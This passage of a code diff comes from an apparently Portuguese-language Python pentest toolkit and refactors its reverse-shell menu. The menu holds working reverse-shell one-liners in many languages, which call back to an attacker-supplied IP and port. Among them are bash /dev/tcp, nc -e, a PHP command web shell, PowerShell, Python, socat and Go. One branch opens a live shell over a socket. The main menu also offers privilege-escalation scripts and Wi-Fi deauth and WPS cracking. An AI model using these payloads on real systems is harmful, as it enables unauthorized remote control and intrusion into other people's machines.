+                            "p.destroy();"+
+                            "s.close();";
+                String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
+                ref.add(new StringRefAddr("x", x);"""]},
+            11: {"label": "|TELNET|", "commands": [
+                'TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip, porta)]},
+            12: {"label": "|ZSH|", "commands": [
+                """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(
+                    ip, porta)]},
+            13: {"label": "|GOLANG|", "commands": [
+                """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""]},
+            0: {"label": "Voltar", "commands": []}
+        }
+
+        while True:
+            print('''
 Você deseja Pesquisar ou Executar?
 
 \033[0;34m[1]\033[m Pesquisar  \033[0;34m[2]\033[m Executar \033[0;34m[0]\033[m Voltar
-    ''')
-        sit_rev=int(input('Escolha uma opção: '))
-        if(sit_rev == 1):
-            ip = input('Digite o IP do Commander: ')
-            porta = input('Digite a Porta: ')
-            print('''\033[1;35m
- ____     ___ __ __    ___  ____    _____   ___       _____ __ __    ___  _      _     
-|    \   /  _]  |  |  /  _]|    \  / ___/  /  _]     / ___/|  |  |  /  _]| |    | |    
-|  D  ) /  [_|  |  | /  [_ |  D  )(   \_  /  [_     (   \_ |  |  | /  [_ | |    | |    
-|    / |    _]  |  ||    _]|    /  \__  ||    _]     \__  ||  _  ||    _]| |___ | |___ 
-|    \ |   [_|  :  ||   [_ |    \  /  \ ||   [_      /  \ ||  |  ||   [_ |     ||     |
-|  .  \|     |\   / |     ||  .  \ \    ||     |     \    ||  |  ||     ||     ||     |
-|__|\_||_____| \_/  |_____||__|\_|  \___||_____|      \___||__|__||_____||_____||_____|
-\033[m     								Sobre: \033[1;33mrevshells.com\033m
- \033[0;34m[1]\033[m  Bash
- \033[0;34m[2]\033[m  NC
- \033[0;34m[3]\033[m  Rust
- \033[0;34m[4]\033[m  PERL
- \033[0;34m[5]\033[m  PHP
- \033[0;34m[6]\033[m  PowerShell
- \033[0;34m[7]\033[m  Python
- \033[0;34m[8]\033[m  SoCat
- \033[0;34m[9]\033[m  Node
- \033[0;34m[10]\033[m JavaScript
- \033[0;34m[11]\033[m TelNet
- \033[0;34m[12]\033[m zsh
- \033[0;34m[13]\033[m GoLang
+            ''')
+            sit_rev = int(input('Escolha uma opção: '))
 
- \033[0;34m[0]\033[m  \033[2;32mInício\033[m
-''')
-            bash = 'sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip,porta)
-            bash196 = '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip,porta)
-            bash_read_line = 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip,porta)
-            bash5 = 'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5'.format(ip,porta)
-            bash_udp = 'sh -i >& /dev/udp/{}/{} 0>&1'.format(ip,porta)
-            nc_mkfifo = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip,porta)
-            nc = 'nc {} {} -e sh'.format(ip,porta)
-            rust = 'rcat {} {} -r sh'.format(ip,porta)
-            perl = """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'"""
-            perl_nosh = """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(ip,porta)
-            php = """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """
-            php_exec = """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip,porta)
-            php_shell = """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip,porta)
-            power64 = """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
-            python_sh= """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(ip,porta)
-            python = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(ip,porta)
-            socat = """socat TCP:{}:{} EXEC:sh""".format(ip,porta)
-            socat_tty = """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip,porta)
-            node = """require('child_process').exec('nc -e sh {} {}')""".format(ip,porta)
-            javascript = """String command = "var host = 'SEUIP';" +
-                        "var port = SUAPORTA;" +
-                        "var cmd = 'sh';"+
-                        "var s = new java.net.Socket(host, port);" +
-                        "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
-                        "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
-                        "var po = p.getOutputStream(), so = s.getOutputStream();"+
-                        "print ('Connected');"+
-                        "while (!s.isClosed()) {"+
-                        "    while (pi.available() > 0)"+
-                        "        so.write(pi.read());"+
-                        "    while (pe.available() > 0)"+
-                        "        so.write(pe.read());"+
-                        "    while (si.available() > 0)"+
-                        "        po.write(si.read());"+
-                        "    so.flush();"+
-                        "    po.flush();"+
-                        "    java.lang.Thread.sleep(50);"+
-                        "    try {"+
-                        "        p.exitValue();"+
-                        "        break;"+
-                        "    }"+
-                        "    catch (e) {"+
-                        "    }"+
-                        "}"+
-                        "p.destroy();"+
-                        "s.close();";
-    String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
-    ref.add(new StringRefAddr("x", x);"""
-            telnet='TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip,porta)
-            zsh = """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(ip,porta)
-            golang = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
+            if sit_rev == 1:
+                display_reverse_shell_options(options)
+                revsit = int(input('Escolha uma opção: '))
 
-            revsit=int(input('Escolha uma opção: '))
-            if revsit == 1:
-                print('')
-                print('|BASH|')
-                print('-\033[0;31m',bash,'\033[m')
-                print('-\033[0;31m',bash196,'\033[m')
-                print('-\033[0;31m',bash_read_line,'\033[m')
-                print('-\033[0;31m',bash5,'\033[m')
-                print('-\033[0;31m',bash_udp,'\033[m')
-                print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 2:
-                print('')
-                print('-\033[0;31m',nc_mkfifo,'\033[m')
-                print('-\033[0;31m',nc,'\033[m');print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 3:
-                print('')
-                print('|RUST|')
-                print('-\033[0;31m',rust,'\033[m')
-                print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 4:
-                print('')
-                print('|PERL|')
-                print('-\033[0;31m',perl,'\033[m')
-                print('-\033[0;31m',perl_nosh,'\033[m')
-                print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 5:
-                print('');print('|PHP|')
-                print('-\033[0;31m',php,'\033[m')
-                print('-\033[0;31m',php_exec,'\033[m')
-                print('-\033[0;31m',php_shell,'\033[m')
-                print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 6:
-                print('');print('|POWERSHELL|');print('-\033[0;31m',power64,'\033[m');print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 7:
-                print('');print('|PYTHON|');print('-\033[0;31m',python,'\033[m');print('-\033[0;31m',python_sh,'\033[m');print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 8:
-                print('');print('|SOCAT|');print('-\033[0;31m',socat,'\033[m');print('-\033[0;31m',socat_tty,'\033[m');print('')
-                input(press)
-                reverse_shell()	
-            elif revsit == 9:
-                print('');print('|NODE|');print('-\033[0;31m',node,'\033[m');print('')
-                input(press)
-                reverse_shell()		
-            elif revsit == 10:
-                print('');print('|JAVASCRIPT|');print('-\033[0;31m',javascript,'\033[m');print('')
-                input(press)
-                reverse_shell()	
-            elif revsit == 11:
-                print('');print('|TELNET|');print('-\033[0;31m',telnet,'\033[m');print('')
-                input(press)
-                reverse_shell()	
-            elif revsit == 12:
-                print('');print('|ZSH|');print('-\033[0;31m',zsh,'\033[m');print('')
-                input(press)
-                reverse_shell()	
-            elif revsit == 13:
-                print('')
-                print('|GOLANG|')
-                print('-\033[0;31m',golang,'\033[m')
-                print('')
-                input(press)
-                reverse_shell()
-            elif revsit == 0:
-                input(press)
-                main()				
-            elif revsit > 13:
+                if revsit in options:
+                    print('')
+                    print(options[revsit]["label"])
+                    for command in options[revsit]["commands"]:
+                        print(f'-\033[0;31m {command}\033[m')
+                    print('')
+                    input('Pressione Enter para continuar...')
+                else:
+                    print('Digite uma opção válida!')
+            elif sit_rev == 2:
+                try:
+                    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip, porta))
+                    print('Conectado com Sucesso!')
+                    comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
+                    print(f"Sugestão de comando: {comando}")
+                    os.dup2(s.fileno(), 0)
+                    os.dup2(s.fileno(), 1)
+                    os.dup2(s.fileno(), 2)
+                    os.system("/bin/sh -i")
+                except OSError:
+                    print('\033[0;31mHost não alcançado\033[m')
+            elif sit_rev == 0:
+                input('Pressione Enter para voltar...')
+                break
+            else:
                 print('Digite uma opção válida!')
-                input(press)
-                reverse_shell()
-        elif(sit_rev == 2):
-            commander=input('Digite o IP: ')
-            porta=int(input('Digite a Porta: '))
-            try:
-                s.connect((commander,porta))
-                print('Conectado com Sucesso!')
-                comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
-                print(f"Sugestão de comando: {comando}")
-                os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
-                p=os.system("/bin/sh -i")
-            except OSError:
-                print('\033[0;31mHost não alcançado\033[m')
-        elif(sit_rev == 0):
-            input(press)
-            main()
-    except ValueError as e:
+
+    except ValueError:
         print('Digite uma opção válida!')
-        input(press)
-        reverse_shell()
+    except Exception as e:
+        print(f'Erro: {e}')
 
 #=======================================================================================
 def server_tcp():
@@ -1199,7 +1452,7 @@ def serverhttp():
         print('Se Deseja usar uma porta baixa, execute com SUDO.')
     except KeyboardInterrupt:
         print('\n'+Ctrl_C)
-   
+
 
 #=======================================================================================
 def wifi_scan():
@@ -1224,13 +1477,13 @@ def wifi_scan():
             bssid = lines[selected_number + 1].split()[0]
             print(f'''\nBSSID escolhido: \033[7;33m{bssid}\033[m
 \nO que deseja fazer?
-                  
+
 \033[0;34m[1]\033[m - Deauth
 \033[0;34m[2]\033[m - WPSCrack
 \033[0;34m[3]\033[m - Em breve
 \033[0;34m[4]\033[m - Em breve
 \033[0;34m[5]\033[m - Em breve
-\033[0;34m[0]\033[m - Sair                  
+\033[0;34m[0]\033[m - Sair
 ''')
             options = {
             1: deauth,
@@ -1249,8 +1502,8 @@ def wifi_scan():
             elif opcao > 24:
                 print('Digite uma opção válida!')
                 input("Pressione Enter para continuar...")
-                  
-            
+
+
         else:
             print("Número inválido. Tente novamente.")
 
@@ -1296,7 +1549,7 @@ def banner():
 
  \033[0;34m[1]\033[m - Criar lista de IPs
  \033[0;34m[2]\033[m - Host Discovery
- \033[0;34m[3]\033[m - Hostname Resolve              
+ \033[0;34m[3]\033[m - Hostname Resolve
  \033[0;34m[4]\033[m - Port Scanner
  \033[0;34m[5]\033[m - NC GET
  \033[0;34m[6]\033[m - WebFinder
@@ -1312,12 +1565,13 @@ def banner():
  \033[0;34m[16]\033[m- LinPeas
  \033[0;34m[17]\033[m- LinEnum
  \033[0;34m[18]\033[m- Potenkin
- \033[0;34m[19]\033[m- SUID
- \033[0;34m[20]\033[m- NC Listen
- \033[0;34m[21]\033[m- Reverse Shell
- \033[0;34m[22]\033[m- Server TCP
- \033[0;34m[23]\033[m- ServerHTTP
- \033[0;34m[24]\033[m- Tryeres
+ \033[0;34m[19]\033[m- Waza
+ \033[0;34m[20]\033[m- SUID
+ \033[0;34m[21]\033[m- NC Listen
+ \033[0;34m[22]\033[m- Reverse Shell
+ \033[0;34m[23]\033[m- Server TCP
+ \033[0;34m[24]\033[m- ServerHTTP
+ \033[0;34m[25]\033[m- Tryeres
  \033[0;34m[0]\033[m - Sair
 ''')
         options = {
@@ -1331,7 +1585,7 @@ def banner():
         8: auto_web,
         9: wifi_scan,
         10: backup,
-        11: clonar,  
+        11: clonar,
         12: cron,
         13: finder,
         14: infosys,
@@ -1339,12 +1593,13 @@ def banner():
         16: linpeas,
         17: linenum,
         #18: Potenkin,  # Adicione a função correspondente à opção 18
-        19: suid,
-        20: nc,
-        21: reverse_shell,
-        22: serverhttp,
+        19: waza,
+        20: suid,
+        21: nc,
+        22: reverse_shell,
         23: serverhttp,
-        24: lambda: os.system('gnome-terminal --title=Python -- sudo python Tryeres/Tryeres.py') or main,
+        24: serverhttp,
+        25: lambda: os.system('gnome-terminal --title=Python -- sudo python Tryeres/Tryeres.py') or main,
         0: lambda: print('Volte sempre! ¯\_(ツ)_/¯') or quit
         }
 
@@ -1357,7 +1612,7 @@ def banner():
             print('Digite uma opção válida!')
             input("Pressione Enter para continuar...")
             main()
-                
+
     except ValueError as e:
         print('Digite uma opção válida!')
         input(press)
@@ -1366,7 +1621,7 @@ def banner():
         print('Digite uma opção válida!')
         input(press)
         main()
-        
+
 
 #=======================================================================================
 def main():
